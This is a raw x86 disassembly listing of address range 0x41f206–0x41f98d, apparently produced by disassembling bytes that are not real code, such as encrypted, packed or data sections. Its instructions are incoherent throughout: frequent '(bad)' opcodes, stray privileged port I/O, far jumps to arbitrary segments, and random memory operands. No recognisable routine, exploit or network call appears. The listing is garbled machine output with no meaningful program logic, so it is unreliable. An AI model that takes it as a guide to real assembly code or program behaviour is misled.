  41f206:	int3   
  41f207:	jns    0x41f1f4
  41f209:	lods   al,BYTE PTR ds:[esi]
  41f20a:	aas    
  41f20b:	jmp    0xa1933c40
  41f210:	xor    ebp,DWORD PTR [edi+ecx*4]
  41f213:	rcl    BYTE PTR [esp+ecx*8],0x6a
  41f217:	adc    ebp,esi
  41f219:	push   cs
  41f21a:	outs   dx,BYTE PTR ds:[esi]
  41f21b:	jge    0x41f27f
  41f21d:	fstp   DWORD PTR [ecx+0x18f3ff8d]
  41f223:	(bad)  [ecx+ebp*1-0x24bc6514]
  41f22a:	stc    
  41f22b:	(bad)  [ebx+0xbd4e6fc]
  41f231:	leave  
  41f232:	jp     0x41f26c
  41f234:	je     0x41f229
  41f236:	jg     0x41f237
  41f238:	push   ss
  41f239:	fucomp st(0)
  41f23b:	(bad)  
  41f23c:	rcl    DWORD PTR ds:0xe4b78200,1
  41f242:	in     al,dx
  41f243:	repnz or bh,BYTE PTR [edx]
  41f246:	in     eax,0x9
  41f248:	mov    WORD PTR [edi+eiz*4+0x4129b351],?
  41f24f:	leave  
  41f250:	rcr    DWORD PTR [edx+ecx*2-0xb0db70e],0x2f
  41f258:	js     0x41f245
  41f25a:	xor    DWORD PTR [ecx-0x2c7729ac],eax
  41f260:	sahf   
  41f261:	clc    
  41f262:	and    bl,BYTE PTR [ebx+0x48]
  41f265:	xchg   ecx,eax
  41f266:	xchg   esp,eax
  41f267:	sbb    eax,0xf987a051
  41f26c:	pop    ds
  41f26d:	sub    al,0x9e
  41f26f:	xchg   esi,eax
  41f270:	and    BYTE PTR [edx-0x3b8862bd],0x6e
  41f277:	sub    ch,bh
  41f279:	mov    fs,WORD PTR [eax-0x79]
  41f27c:	leave  
  41f27d:	jle    0x41f22d
  41f27f:	xor    eax,0x96def414
  41f284:	shl    DWORD PTR [esi],0x8
  41f287:	retf   
  41f288:	cmc    
  41f289:	jge    0x41f2ef
  41f28b:	ficomp WORD PTR ds:[ebp+edi*2+0x198dd3b2]
  41f293:	push   edi
  41f294:	rcr    edx,cl
  41f296:	out    0x60,eax
  41f298:	cdq    
  41f299:	xchg   esi,eax
  41f29a:	imul   edx,eax,0xffffff90
  41f29d:	and    esi,ecx
  41f29f:	mov    edi,0x3e2e4668
  41f2a4:	ret    
  41f2a5:	jno    0x41f2ea
  41f2a7:	int    0xc8
  41f2a9:	dec    ebx
  41f2aa:	jl     0x41f2e3
  41f2ac:	sub    ch,BYTE PTR ds:0x1076c491
  41f2b2:	bound  ebx,QWORD PTR [edi+eax*1+0x1]
  41f2b6:	in     eax,dx
  41f2b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2b8:	dec    edi
  41f2b9:	sbb    DWORD PTR [esi+esi*8+0x38c00db8],0x662a6e74
  41f2c4:	pushf  
  41f2c5:	push   eax
  41f2c6:	shr    DWORD PTR [edx+0x261c3835],0xf1
  41f2cd:	arpl   WORD PTR [esi+0x420872b1],cx
  41f2d3:	pop    esi
  41f2d4:	not    BYTE PTR [ebx+eax*8]
  41f2d7:	rcr    DWORD PTR [ebp+0x203e349c],0xe
  41f2de:	adc    DWORD PTR [esi+0x3db2ecb8],eax
  41f2e4:	mov    esi,DWORD PTR [edi-0x1e5c63c0]
  41f2ea:	xor    al,0xf7
  41f2ec:	test   eax,0x432c6d6b
  41f2f1:	popf   
  41f2f2:	or     dh,ah
  41f2f4:	sub    esi,ebx
  41f2f6:	mov    cl,0x65
  41f2f8:	pop    eax
  41f2f9:	or     dh,BYTE PTR [eax+0x29ce4167]
  41f2ff:	pusha  
  41f300:	mov    WORD PTR [ecx+eiz*2-0x7358b0c],?
  41f307:	pop    ds
  41f308:	push   esp
  41f309:	ror    DWORD PTR [ebx],cl
  41f30b:	jmp    0x1f0be006
  41f310:	inc    edx
  41f311:	leave  
  41f312:	xor    BYTE PTR [ebx+0x47754167],bl
  41f318:	add    BYTE PTR [eax+0x54],bh
  41f31b:	xor    BYTE PTR [eax-0x40],dh
  41f31e:	push   0xbeba04e0
  41f323:	sub    ah,BYTE PTR [edi+0x6a]
  41f326:	xchg   ebx,eax
  41f327:	je     0x41f309
  41f329:	fbld   TBYTE PTR [edi-0x762a3835]
  41f32f:	imul   esp,DWORD PTR [ecx],0xb72c0282
  41f335:	mov    ch,0x6f
  41f337:	jp     0x41f390
  41f339:	xor    eax,0xa6c1efd9
  41f33e:	mov    dh,0x27
  41f340:	xor    BYTE PTR [edi-0x5f],dl
  41f343:	bsf    esi,DWORD PTR [ecx-0x61243082]
  41f34a:	mov    ebx,0xdd95daed
  41f34f:	push   edx
  41f350:	xlat   BYTE PTR ds:[ebx]
  41f351:	cs retf 
  41f353:	test   eax,0xb3a040d8
  41f358:	cld    
  41f359:	neg    BYTE PTR [ebx+0x4b]
  41f35c:	cmp    BYTE PTR [eax+0x4797158],dl
  41f362:	inc    edx
  41f363:	fsubp  st(1),st
  41f365:	pop    edx
  41f366:	adc    BYTE PTR [ecx+0x11],bh
  41f369:	iret   
  41f36a:	(bad)  
  41f36b:	mov    dx,0x9300
  41f36f:	or     esi,0xd132e29e
  41f375:	lods   al,BYTE PTR ds:[esi]
  41f376:	mov    edi,0x7fe15df2
  41f37b:	xor    al,ah
  41f37d:	adc    ah,BYTE PTR [ebp-0x2587e5f0]
  41f383:	in     eax,dx
  41f384:	fcomi  st,st(4)
  41f386:	sub    al,0x6e
  41f388:	sub    bh,BYTE PTR [ecx]
  41f38a:	rcr    BYTE PTR [edi],cl
  41f38c:	fsubr  st,st(2)
  41f38e:	jo     0x41f3d5
  41f390:	xlat   BYTE PTR ds:[ebx]
  41f391:	mov    fs,WORD PTR [edx]
  41f393:	icebp  
  41f394:	mov    dh,0x47
  41f396:	scas   al,BYTE PTR es:[edi]
  41f397:	sbb    dl,ah
  41f399:	out    0xf5,al
  41f39b:	out    dx,al
  41f39c:	adc    DWORD PTR [esi+0x7781f65d],0x36bd0127
  41f3a6:	sub    eax,0x738087d6
  41f3ab:	mov    ecx,0xfe70c2d1
  41f3b0:	mov    ebp,0x64613636
  41f3b5:	adc    ah,BYTE PTR [eax-0x32ddfca5]
  41f3bb:	cmp    al,0x43
  41f3bd:	in     al,dx
  41f3be:	in     al,0x68
  41f3c0:	loopne 0x41f3fd
  41f3c2:	xchg   ebp,eax
  41f3c3:	(bad)  
  41f3c4:	fnstenv [ecx]
  41f3c6:	adc    eax,0x2b668540
  41f3cb:	stc    
  41f3cc:	push   es
  41f3cd:	jmp    0x41f440
  41f3cf:	mov    bl,0x66
  41f3d1:	int3   
  41f3d2:	in     al,0xad
  41f3d4:	(bad)  
  41f3d5:	pop    es
  41f3d6:	fwait
  41f3d7:	push   edi
  41f3d8:	cwde   
  41f3d9:	and    BYTE PTR [ebp+0x46b4526d],bh
  41f3df:	lahf   
  41f3e0:	clc    
  41f3e1:	and    al,0xa4
  41f3e3:	rcr    edi,cl
  41f3e5:	fldenv [ebx-0x1b]
  41f3e8:	xchg   ebp,eax
  41f3e9:	cmp    DWORD PTR [ebx+0x266ec79e],ebp
  41f3ef:	push   es
  41f3f0:	retf   
  41f3f1:	cwde   
  41f3f2:	push   esi
  41f3f3:	xor    ch,BYTE PTR [edx-0x76]
  41f3f6:	retf   0x33c5
  41f3f9:	pop    esi
  41f3fa:	ja     0x41f431
  41f3fc:	mov    ecx,0xeb25481a
  41f401:	aas    
  41f402:	dec    ecx
  41f403:	addr16 enter 0x7a43,0x56
  41f408:	add    BYTE PTR [ebx+eax*2],0x15
  41f40c:	adc    al,BYTE PTR [esp+edx*1+0xf]
  41f410:	mov    dh,BYTE PTR [edx-0x65dfff10]
  41f416:	stos   DWORD PTR es:[edi],eax
  41f417:	sbb    eax,0x4b911764
  41f41c:	mov    edx,0xfaeb8085
  41f421:	jmp    0x6675:0xc701c53d
  41f428:	fdivr  st,st(5)
  41f42a:	and    edi,DWORD PTR [ebx+edi*4]
  41f42d:	jno    0x41f49e
  41f42f:	xor    al,0x44
  41f431:	fistp  WORD PTR es:[eax+edi*1]
  41f435:	repz jne 0x41f3e4
  41f438:	sbb    eax,DWORD PTR [ecx-0x1356b353]
  41f43e:	dec    edx
  41f43f:	push   ecx
  41f440:	(bad)  [edi]
  41f442:	jb     0x41f3f7
  41f444:	scas   al,BYTE PTR es:[edi]
  41f445:	inc    eax
  41f446:	or     BYTE PTR [edx+ebp*1-0x5c164fa],bh
  41f44d:	fs mov edx,0x121dc621
  41f453:	fdivr  QWORD PTR [eax+esi*2-0x25]
  41f457:	cmp    al,0xed
  41f459:	and    eax,edx
  41f45b:	xchg   esp,eax
  41f45c:	out    dx,al
  41f45d:	push   ecx
  41f45e:	cli    
  41f45f:	stc    
  41f460:	inc    eax
  41f461:	mov    dh,BYTE PTR [eax+0x6a]
  41f464:	jnp    0x41f443
  41f466:	inc    esp
  41f467:	and    al,BYTE PTR [eax+0x2e]
  41f46a:	fwait
  41f46b:	gs icebp 
  41f46d:	in     al,0xb6
  41f46f:	adc    DWORD PTR [edi+0x74],esi
  41f472:	or     al,0x38
  41f474:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f475:	sti    
  41f476:	js     0x41f4b1
  41f478:	ficom  DWORD PTR [esi+esi*2-0x66]
  41f47c:	les    ebx,FWORD PTR [ebp+0x653dc7d2]
  41f482:	aaa    
  41f483:	hlt    
  41f484:	out    dx,eax
  41f485:	pop    esp
  41f486:	addr16 cli 
  41f488:	pop    ebx
  41f489:	jmp    0xb32ce441
  41f48e:	inc    ebp
  41f48f:	adc    bh,BYTE PTR [edi+0x3b]
  41f492:	inc    edi
  41f493:	add    al,0xd5
  41f495:	mov    eax,0xaef4f70c
  41f49a:	(bad)  
  41f49b:	popa   
  41f49c:	add    eax,DWORD PTR [edi]
  41f49e:	(bad)  
  41f49f:	fisttp WORD PTR [ebx]
  41f4a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4a3:	jnp    0x41f4b2
  41f4a5:	xor    ch,bh
  41f4a7:	fsubp  st(7),st
  41f4a9:	cmp    esi,DWORD PTR [edi-0x19]
  41f4ac:	les    eax,FWORD PTR [ebp+ecx*4-0x28fd444b]
  41f4b3:	das    
  41f4b4:	daa    
  41f4b5:	add    edx,DWORD PTR [esi+0x61]
  41f4b8:	dec    esi
  41f4b9:	shr    DWORD PTR [ecx-0x308b361f],1
  41f4bf:	dec    ebx
  41f4c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4c1:	popf   
  41f4c2:	mov    cl,0x66
  41f4c4:	mov    BYTE PTR ds:0x77c24754,cl
  41f4ca:	push   ebp
  41f4cb:	loop   0x41f4a1
  41f4cd:	ror    BYTE PTR [ebx+esi*1-0x94829e],cl
  41f4d4:	dec    ebx
  41f4d5:	mov    eax,ds:0x3c452ad5
  41f4da:	mov    bh,0x6e
  41f4dc:	(bad)  
  41f4dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4df:	xor    BYTE PTR [edi+edi*2+0x57],0x41
  41f4e4:	jp     0x41f486
  41f4e6:	dec    esi
  41f4e7:	cmp    dh,BYTE PTR [ebp-0x5c804e33]
  41f4ed:	mov    bh,0x7
  41f4ef:	cwde   
  41f4f0:	xchg   esp,eax
  41f4f1:	adc    al,0x46
  41f4f3:	sub    al,0xad
  41f4f5:	cmp    ebp,DWORD PTR [edi]
  41f4f7:	loopne 0x41f543
  41f4f9:	mov    ?,eax
  41f4fb:	and    DWORD PTR [esi-0x6a50abf7],esp
  41f501:	out    0x64,eax
  41f503:	cwde   
  41f504:	outs   dx,DWORD PTR ds:[esi]
  41f505:	cmp    al,0x50
  41f507:	push   es
  41f508:	pop    edx
  41f509:	fnstcw WORD PTR [ebx]
  41f50b:	repnz adc ch,dl
  41f50e:	xchg   edx,eax
  41f50f:	std    
  41f510:	out    dx,eax
  41f511:	imul   DWORD PTR [ecx-0x9082ef9]
  41f517:	mov    esp,0xff67979f
  41f51c:	push   0x5123799
  41f521:	push   esp
  41f522:	ror    DWORD PTR [eax-0x69],cl
  41f525:	ja     0x41f524
  41f527:	mov    al,ds:0x91711768
  41f52c:	mov    ds:0x9a893993,al
  41f531:	mov    bh,0x9a
  41f533:	fwait
  41f534:	pop    ebp
  41f535:	int    0x6e
  41f537:	sahf   
  41f538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f539:	loop   0x41f543
  41f53b:	sub    DWORD PTR [ecx-0x24],eax
  41f53e:	test   eax,0xd6839c4c
  41f543:	xor    DWORD PTR [esi+0x4a616232],ebx
  41f549:	fld    QWORD PTR [ebx-0x65cb20c2]
  41f54f:	sbb    edx,DWORD PTR [ebx]
  41f551:	jg     0x41f4d9
  41f553:	arpl   dx,bx
  41f555:	and    ecx,ecx
  41f557:	pop    ds
  41f558:	mov    eax,0x52e747be
  41f55d:	push   cs
  41f55e:	dec    esp
  41f55f:	and    eax,0x3050ca71
  41f564:	outs   dx,DWORD PTR ds:[esi]
  41f565:	into   
  41f566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f567:	frstor [esi-0x11]
  41f56a:	sysenter 
  41f56c:	pop    esp
  41f56d:	stos   DWORD PTR es:[edi],eax
  41f56e:	das    
  41f56f:	pusha  
  41f570:	push   ebx
  41f571:	mov    eax,ds:0x29cee339
  41f576:	and    DWORD PTR [ebx-0x2],eax
  41f579:	call   FWORD PTR ds:0xc405211a
  41f57f:	imul   ecx,ebp,0x3b
  41f582:	inc    esp
  41f583:	lahf   
  41f584:	xor    ah,BYTE PTR [edi+ebp*1+0x6e]
  41f588:	mov    ah,0xa1
  41f58a:	jmp    0x9916:0xbe1de897
  41f591:	mov    eax,ds:0x46406fc8
  41f596:	mov    eax,ds:0x87b77d94
  41f59b:	mov    dl,0x9e
  41f59d:	dec    ebx
  41f59e:	push   esi
  41f59f:	mov    edx,0xf0e9bcf4
  41f5a4:	mov    edi,0x4581fd25
  41f5a9:	fcomp  st(6)
  41f5ab:	fwait
  41f5ac:	imul   esp,DWORD PTR [edx-0x59],0xa8ff0ca
  41f5b3:	into   
  41f5b4:	popa   
  41f5b5:	add    al,0xcb
  41f5b7:	mov    ebx,0x945dd850
  41f5bc:	shl    cl,cl
  41f5be:	ds (bad) 
  41f5c0:	jae    0x41f616
  41f5c2:	cmc    
  41f5c3:	aad    0x56
  41f5c5:	mov    ecx,0x3fa558e5
  41f5ca:	into   
  41f5cb:	sti    
  41f5cc:	(bad)  
  41f5cd:	add    cl,cl
  41f5cf:	(bad)  
  41f5d1:	adc    dl,dh
  41f5d3:	push   ecx
  41f5d4:	add    DWORD PTR [esi+0x54118652],esi
  41f5da:	push   0xffffff81
  41f5dc:	int    0xd6
  41f5de:	icebp  
  41f5df:	mov    eax,ds:0xe161c444
  41f5e4:	adc    esi,DWORD PTR [edi+edi*8-0x594a0d49]
  41f5eb:	mov    esi,0xb354f4ac
  41f5f0:	sbb    DWORD PTR [edx+0xa],ebx
  41f5f3:	dec    edi
  41f5f4:	pop    ss
  41f5f5:	fmul   st,st(4)
  41f5f7:	repz pop ecx
  41f5f9:	jl     0x41f60a
  41f5fb:	xor    esp,DWORD PTR [ebx]
  41f5fd:	out    0x47,al
  41f5ff:	mov    es,WORD PTR gs:[esi+0x23534810]
  41f606:	sub    eax,DWORD PTR [ebx-0x7b]
  41f609:	and    edi,DWORD PTR [esi+0x7550bc4]
  41f60f:	cwde   
  41f610:	test   al,0x2
  41f612:	dec    ebx
  41f613:	xor    al,0x95
  41f615:	mov    al,ds:0x3a0266e0
  41f61a:	adc    eax,0x29a25d23
  41f61f:	jae    0x41f67d
  41f621:	dec    esp
  41f622:	mov    edx,0x3ac19051
  41f627:	adc    BYTE PTR [ebx],dh
  41f629:	mov    WORD PTR [edx+edx*4],cs
  41f62c:	test   eax,0x67c7423
  41f631:	and    eax,0xc8e8a36f
  41f636:	mov    bh,0xfe
  41f638:	or     bl,ch
  41f63a:	(bad)
  41f63e:	or     ebp,ebx
  41f640:	dec    eax
  41f641:	std    
  41f642:	adc    BYTE PTR [esi+0x3f8b1b5a],bl
  41f648:	or     ebp,0xffffff9f
  41f64b:	ins    DWORD PTR es:[edi],dx
  41f64c:	or     eax,0xb47ebaf7
  41f651:	fstp   DWORD PTR [edx-0x490a8f59]
  41f657:	jp     0x41f66e
  41f659:	cmp    esi,DWORD PTR [esi-0x20]
  41f65c:	jb     0x41f644
  41f65e:	push   ss
  41f65f:	js     0x41f675
  41f661:	and    eax,0xbce4048e
  41f666:	ins    DWORD PTR es:[edi],dx
  41f667:	fcom   QWORD PTR [ebx+ebp*1+0x9]
  41f66b:	fadd   QWORD PTR [ebp+0x52]
  41f66e:	jae    0x41f605
  41f670:	cmp    ebx,DWORD PTR [edx+0x674a72d9]
  41f676:	push   ebp
  41f677:	jmp    0x4f39:0x89e710c3
  41f67e:	test   al,0xc5
  41f680:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f682:	push   edx
  41f683:	aam    0x3b
  41f685:	or     al,dh
  41f687:	ss pop es
  41f689:	xchg   edx,eax
  41f68a:	adc    dl,BYTE PTR [eax-0x2a946540]
  41f690:	enter  0xdda,0xd5
  41f694:	xchg   edi,eax
  41f695:	xlat   BYTE PTR ds:[ebx]
  41f696:	mov    gs,WORD PTR [esi]
  41f698:	imul   ebx,DWORD PTR [ecx+ebx*8+0x2225ee8e],0xffffffc7
  41f6a0:	push   edi
  41f6a1:	mov    ch,0xc8
  41f6a3:	sbb    DWORD PTR [edi-0x55a8f020],ebx
  41f6a9:	jae    0x41f6ee
  41f6ab:	pop    ebp
  41f6ac:	sbb    al,0xa4
  41f6ae:	imul   esp,ebp,0xffffff9a
  41f6b1:	not    ecx
  41f6b3:	xor    eax,0x6645452
  41f6b8:	mov    eax,ds:0x3d54b47d
  41f6bd:	mov    esp,DWORD PTR [eax-0x5b]
  41f6c0:	jge    0x41f655
  41f6c2:	ret    0xc4d0
  41f6c5:	repnz xor ebp,eax
  41f6c8:	mov    eax,0x78d14780
  41f6cd:	sub    ah,ch
  41f6cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6d0:	push   ss
  41f6d1:	push   cs
  41f6d2:	mov    ecx,0x66d6e83c
  41f6d7:	daa    
  41f6d8:	add    BYTE PTR [ebx-0x1649b6c5],dl
  41f6de:	pop    edi
  41f6df:	pusha  
  41f6e0:	lods   al,BYTE PTR ds:[esi]
  41f6e1:	inc    ebx
  41f6e2:	(bad)  
  41f6e3:	ret    
  41f6e4:	sub    al,BYTE PTR [edx+0x17]
  41f6e7:	je     0x41f75f
  41f6e9:	fwait
  41f6ea:	shl    BYTE PTR [ebx-0x39],0x4b
  41f6ee:	test   ebp,ecx
  41f6f0:	test   BYTE PTR [ecx],bl
  41f6f2:	sahf   
  41f6f3:	scas   eax,DWORD PTR es:[edi]
  41f6f4:	out    dx,eax
  41f6f5:	push   es
  41f6f6:	mov    dh,0x7e
  41f6f8:	lock fadd QWORD PTR [esi+0x1e]
  41f6fc:	xchg   esi,eax
  41f6fd:	mov    eax,ds:0x4395eb42
  41f702:	mov    al,ds:0xcaf3ee7f
  41f707:	out    dx,eax
  41f708:	jg     0x41f6f2
  41f70a:	inc    eax
  41f70b:	push   es
  41f70c:	ret    
  41f70d:	push   esp
  41f70e:	scas   al,BYTE PTR es:[edi]
  41f70f:	and    BYTE PTR [eax-0x35a08189],al
  41f715:	cli    
  41f716:	jecxz  0x41f6ba
  41f718:	dec    esi
  41f719:	fistp  QWORD PTR [esi]
  41f71b:	pusha  
  41f71c:	js     0x41f6fd
  41f71e:	cli    
  41f71f:	dec    BYTE PTR ds:0x91cd494c
  41f725:	cmp    BYTE PTR [edx+0x21],ah
  41f728:	bnd addr16 jnp 0x41f744
  41f72c:	cld    
  41f72d:	mov    edi,0x476184b8
  41f732:	mov    WORD PTR [edx+0x77a0e8e7],ss
  41f738:	cld    
  41f739:	push   ebx
  41f73a:	sub    bh,ah
  41f73c:	ror    ch,1
  41f73e:	scas   eax,DWORD PTR es:[edi]
  41f73f:	and    cl,BYTE PTR [esi+0x145a97d2]
  41f745:	xor    al,0xa9
  41f747:	loope  0x41f757
  41f749:	add    eax,0x77d6ebf9
  41f74e:	jo     0x41f79d
  41f750:	xchg   edx,eax
  41f751:	and    DWORD PTR [ebx+0x4452e8b6],ebp
  41f757:	mov    esi,0x2efac292
  41f75c:	sbb    dl,BYTE PTR [ebp+0x1fbf25d6]
  41f762:	fwait
  41f763:	push   esp
  41f764:	fld    st(6)
  41f766:	data16 add BYTE PTR [ecx+ecx*1+0x64fc5171],cl
  41f76e:	not    DWORD PTR [esi]
  41f770:	(bad)  
  41f772:	stc    
  41f773:	mov    bh,0x38
  41f775:	clc    
  41f776:	pop    ebx
  41f777:	rcr    DWORD PTR [eax+eax*2-0x1adfc6a],cl
  41f77e:	jno    0x41f720
  41f780:	jb     0x41f7a4
  41f782:	js     0x41f75f
  41f784:	outs   dx,DWORD PTR ds:[esi]
  41f785:	repnz cs add eax,0x754592dc
  41f78c:	std    
  41f78d:	mov    al,ds:0xab942861
  41f792:	mov    BYTE PTR [ebp+0x2ccdf87f],al
  41f798:	mov    esi,0xde428c79
  41f79d:	pop    ecx
  41f79e:	in     al,dx
  41f79f:	scas   al,BYTE PTR es:[edi]
  41f7a0:	mov    es,WORD PTR [edx]
  41f7a2:	push   edx
  41f7a3:	popa   
  41f7a4:	sub    BYTE PTR [ebp-0x3],dh
  41f7a7:	xor    ebx,DWORD PTR [edx]
  41f7a9:	add    eax,0x92de18d1
  41f7ae:	(bad)  
  41f7af:	ffree  st(1)
  41f7b1:	leave  
  41f7b2:	dec    eax
  41f7b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7b4:	fldpi  
  41f7b6:	pushf  
  41f7b7:	test   BYTE PTR [edi-0x56],al
  41f7ba:	test   al,0xdd
  41f7bc:	or     ah,dl
  41f7be:	add    DWORD PTR [ebx-0x3f7d3728],ebx
  41f7c4:	test   al,0x76
  41f7c6:	fistp  WORD PTR [ebp+0x70]
  41f7c9:	add    DWORD PTR [esi],ecx
  41f7cb:	les    esi,FWORD PTR [eax+0x23783882]
  41f7d1:	sub    eax,0x1027ef49
  41f7d6:	ss cdq 
  41f7d8:	in     al,dx
  41f7d9:	adc    DWORD PTR [ebp+0xbdb8d21],0xffffffa1
  41f7e0:	pop    ds
  41f7e1:	sbb    BYTE PTR [eax+0xd],cl
  41f7e4:	mov    WORD PTR ds:0xa84d8db8,cs
  41f7ea:	cs imul ebp
  41f7ed:	daa    
  41f7ee:	leave  
  41f7ef:	adc    al,0x2d
  41f7f1:	pop    eax
  41f7f2:	sbb    bl,BYTE PTR [edx]
  41f7f4:	dec    esp
  41f7f5:	and    al,bh
  41f7f7:	mov    esi,0x72f14efd
  41f7fc:	sub    esp,DWORD PTR [ecx]
  41f7fe:	stc    
  41f7ff:	or     BYTE PTR [ebx+0x3],ch
  41f802:	shr    BYTE PTR [ebp-0x169d3722],0x72
  41f809:	add    BYTE PTR [ecx+esi*8],ah
  41f80c:	inc    eax
  41f80d:	xor    eax,0x25e518fa
  41f812:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f813:	dec    DWORD PTR [edx]
  41f815:	repz repz pop esi
  41f818:	sti    
  41f819:	test   eax,0x40c3634c
  41f81e:	add    ch,bl
  41f820:	xor    ebp,DWORD PTR [edi]
  41f822:	add    al,0xde
  41f824:	push   0xffffffc8
  41f826:	jne    0x41f7d8
  41f828:	cmp    BYTE PTR [esi],ah
  41f82a:	pop    ss
  41f82b:	push   ebx
  41f82c:	push   0x1fca0f1
  41f831:	pop    edx
  41f832:	int    0x3b
  41f834:	sahf   
  41f835:	enter  0xc7eb,0xe5
  41f839:	(bad)  
  41f83a:	dec    edi
  41f83b:	inc    eax
  41f83c:	lods   eax,DWORD PTR ds:[esi]
  41f83d:	dec    ebp
  41f83e:	and    eax,0x832bc261
  41f843:	lahf   
  41f844:	push   edi
  41f845:	pop    esi
  41f846:	(bad)  
  41f847:	xchg   esi,eax
  41f848:	cmp    bl,0x25
  41f84b:	push   ds
  41f84c:	and    bl,0x7a
  41f84f:	or     bh,BYTE PTR [ebx+ecx*4-0x5e]
  41f853:	hlt    
  41f854:	xchg   esp,eax
  41f855:	fldln2 
  41f857:	cmp    BYTE PTR [edi],bl
  41f859:	xchg   edi,eax
  41f85a:	icebp  
  41f85b:	jmp    0x41f843
  41f85d:	ret    
  41f85e:	fistp  QWORD PTR ds:0x172314b6
  41f864:	test   DWORD PTR [esi+0x9],edi
  41f867:	pop    ebx
  41f868:	aas    
  41f869:	cwde   
  41f86a:	ins    BYTE PTR es:[edi],dx
  41f86b:	mov    cl,BYTE PTR [eax+0x68dbbcfa]
  41f871:	jp     0x41f8a1
  41f873:	sub    dl,0xa7
  41f876:	xor    BYTE PTR [edx-0xd53c41f],bl
  41f87c:	ss mov cl,0xbb
  41f87f:	ss dec ebx
  41f881:	and    cl,BYTE PTR [ebp+0x61]
  41f884:	mov    ebp,0x6b93292d
  41f889:	pop    edi
  41f88a:	jg     0x41f8d5
  41f88c:	out    0xf8,eax
  41f88e:	repnz fmul QWORD PTR [edx-0x6d]
  41f892:	jecxz  0x41f8ae
  41f894:	dec    edx
  41f895:	loopne 0x41f826
  41f897:	mov    esp,0x6a5a29e3
  41f89c:	or     cl,BYTE PTR [ebp-0x2c]
  41f89f:	pop    ds
  41f8a0:	jmp    0x7ee56275
  41f8a5:	mov    ds:0xd3880a06,al
  41f8aa:	arpl   WORD PTR [edx],sp
  41f8ac:	out    dx,al
  41f8ad:	push   ebx
  41f8ae:	call   0xfc1184fa
  41f8b3:	jmp    0x24f9:0xa02a8b63
  41f8ba:	pop    eax
  41f8bb:	pop    ecx
  41f8bc:	mov    ebp,DWORD PTR [edi-0x510955a2]
  41f8c2:	or     al,0xed
  41f8c4:	pop    edx
  41f8c5:	retf   
  41f8c6:	cli    
  41f8c7:	xchg   dx,ax
  41f8c9:	sar    DWORD PTR [ebp+0x1d],1
  41f8cc:	ja     0x41f8a9
  41f8ce:	scas   al,BYTE PTR es:[edi]
  41f8cf:	add    DWORD PTR [esp+esi*8-0x56efff9b],edx
  41f8d6:	inc    edx
  41f8d7:	sbb    eax,DWORD PTR [ecx]
  41f8d9:	xchg   ebx,eax
  41f8da:	icebp  
  41f8db:	ins    BYTE PTR es:[edi],dx
  41f8dc:	xor    al,0xa3
  41f8de:	xor    ebx,0x2ec9ed74
  41f8e4:	xor    edx,edx
  41f8e6:	pusha  
  41f8e7:	jae    0x41f943
  41f8e9:	dec    eax
  41f8ea:	add    al,0x93
  41f8ec:	cwde   
  41f8ed:	adc    DWORD PTR [edi],ecx
  41f8ef:	cmp    DWORD PTR [eax+ecx*1-0x69],edi
  41f8f3:	fcom   QWORD PTR [esi]
  41f8f5:	xchg   di,ax
  41f8f7:	iret   
  41f8f8:	sahf   
  41f8f9:	(bad)  
  41f8fa:	ret    
  41f8fb:	outs   dx,DWORD PTR ds:[esi]
  41f8fc:	out    0xe8,eax
  41f8fe:	sbb    DWORD PTR [edx+0x5094feb6],edi
  41f904:	mov    esp,0x91938cf8
  41f909:	push   ebp
  41f90a:	push   ecx
  41f90b:	mov    cs,ebp
  41f90d:	daa    
  41f90e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f90f:	ins    BYTE PTR es:[edi],dx
  41f910:	std    
  41f911:	out    0xf6,eax
  41f913:	jecxz  0x41f94a
  41f915:	pop    ebp
  41f916:	and    ebx,eax
  41f918:	imul   esi,DWORD PTR [eax-0x598d253b],0xffffffa4
  41f91f:	dec    edx
  41f920:	cmp    BYTE PTR [edi],ch
  41f922:	popf   
  41f923:	cmp    DWORD PTR [ecx],esp
  41f925:	dec    edx
  41f926:	iret   
  41f927:	add    dl,BYTE PTR [esp+edi*2-0x7a]
  41f92b:	pop    esi
  41f92c:	fwait
  41f92d:	loopne 0x41f99b
  41f92f:	xor    BYTE PTR [edi+0x33],al
  41f932:	add    DWORD PTR [eax+0x1e],eax
  41f935:	ror    BYTE PTR [eax+0x4c],1
  41f938:	mov    dl,0xf1
  41f93a:	jmp    0xd4e4:0xf849852b
  41f941:	cwde   
  41f942:	fdiv   st,st(4)
  41f944:	mov    ah,0x1c
  41f946:	add    bh,BYTE PTR [ebp+0x36]
  41f949:	hlt    
  41f94a:	inc    edx
  41f94b:	xchg   edi,eax
  41f94c:	loope  0x41f8cf
  41f94e:	xchg   ecx,eax
  41f94f:	pusha  
  41f950:	and    edi,DWORD PTR [esi]
  41f952:	sbb    DWORD PTR [ecx+0x26],0xffffffc7
  41f956:	stc    
  41f957:	nop
  41f958:	cwde   
  41f959:	arpl   WORD PTR [ecx+edx*8-0x2e],bp
  41f95d:	mov    ah,0xf1
  41f95f:	test   eax,0xddb310ed
  41f964:	jae    0x41f962
  41f966:	(bad)  
  41f967:	cmc    
  41f968:	out    0xc1,al
  41f96a:	mov    esp,0xcb8cf04e
  41f96f:	nop
  41f970:	mov    esp,0x89754370
  41f975:	mov    eax,ds:0xdc3b2a77
  41f97a:	pusha  
  41f97b:	retf   
  41f97c:	push   ds
  41f97d:	into   
  41f97e:	leave  
  41f97f:	ins    BYTE PTR es:[edi],dx
  41f980:	arpl   cx,di
  41f982:	push   eax
  41f983:	addr16 mov al,0x8e
  41f986:	gs mov cl,0xfd
  41f989:	or     ebp,ebp
  41f98b:	aaa    
  41f98c:	push   eax
  41f98d:	test   DWORD PTR [ecx],0xb8bb16cf
